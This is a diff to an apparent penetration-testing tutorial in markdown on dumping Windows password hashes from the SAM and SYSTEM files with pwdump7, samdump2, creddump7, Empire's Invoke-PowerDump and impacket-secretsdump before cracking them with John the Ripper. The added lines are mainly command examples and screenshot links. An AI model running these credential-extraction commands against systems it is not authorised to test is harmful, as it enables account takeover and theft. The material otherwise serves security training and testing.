@@ -88,9 +88,16 @@ samdump2 SYSTEM SAM
  This tool extracts the SAM file from the system and dumps its credentials
 
 download :https://www.tarasco.org/security/pwdump_7/pwdump7.zip
-
-<img src="/img/cred1/t1.PNG" alt="Getting-gz" width="800" height="200"> 
-
+windws7
+```
+pwdump7.exe 
+```
+<img src="/img/cred1/pd7.PNG" alt="Getting-gz" width="800" height="200"> 
+windows10
+```
+pwdump7.exe
+```
+<img src="/img/cred1/pd77.PNG" alt="Getting-gz" width="800" height="200"> 
 
 ```
 https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1
@@ -101,12 +108,17 @@ sudo apt install python-crypto
 sudo git clone https://github.com/Neohapsis/creddump7
 python pwdump.py /home/kali/system /home/kali/sam
 ```
-    
+
+<img src="/img/cred1/cred7.PNG" alt="Getting-gz" width="800" height="200"> 
+
     
 ## impacket
+Impacket tool can also extract all the hashes for you from the SAM file
 ```
 impacket-secretsdump -system SYSTEM -sam SAM local
 ```
+<img src="/img/cred1/impacket.PNG" alt="Getting-gz" width="800" height="200"> 
+
 
 ## Decrypting Hash
 John The Ripper
